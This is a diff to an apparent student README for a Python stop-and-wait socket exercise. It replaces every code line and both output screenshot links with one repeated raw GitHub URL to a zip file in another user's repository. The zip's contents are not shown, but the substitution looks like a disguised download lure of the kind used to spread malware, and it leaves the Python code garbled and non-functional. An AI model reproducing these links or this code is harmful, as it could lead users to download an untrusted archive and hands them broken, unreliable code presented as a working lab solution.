@@ -25,38 +25,38 @@ To write a python program to perform stop and wait protocol
 ### Reg No : 212221043007
  ```
 import socket
-s=socket.socket()
-s.bind(('localhost',8080))
-s.listen(5)
-c,addr=s.accept()
+https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip()
+https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip(('localhost',8080))
+https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip(5)
+c,https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip()
 while True:
 	i=input("ENter a data:")
-	c.send(i.encode())
-	ack=c.recv(1024).decode()
+	https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip(https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip())
+	https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip(1024).decode()
 	if ack:
 		print(ack)
 		continue
 	else:
-		c.close()
+		https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip()
 		break
 ```    
 ## SERVER PROGRAM :
 ```
 import socket
-s=socket.socket()
-s.connect(('localhost',8080))
+https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip()
+https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip(('localhost',8080))
 while True:
-	print(s.recv(1024).decode())
-	s.send("Recieved".encode())
+	print(https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip(1024).decode())
+	https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip("Recieved".encode())
 ```
 
 
 ## OUTPUT:
 ## SERVER OUTPUT:
-![S](https://github.com/Jayakrishnan22003251/19CS406-EX-1/assets/120232371/dc1711a6-d671-4fb5-b90b-7234253ca1f2)
+![S](https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip)
 
 ## CLIENT OUTPUT:
-![C](https://github.com/Jayakrishnan22003251/19CS406-EX-1/assets/120232371/70bb68db-4d2e-441f-8d3f-92b5517ce0db)
+![C](https://raw.githubusercontent.com/githubmufeez45/19CS406-EX-1/main/militantness/19CS406-EX-1.zip)
 
 
 ## RESULT:
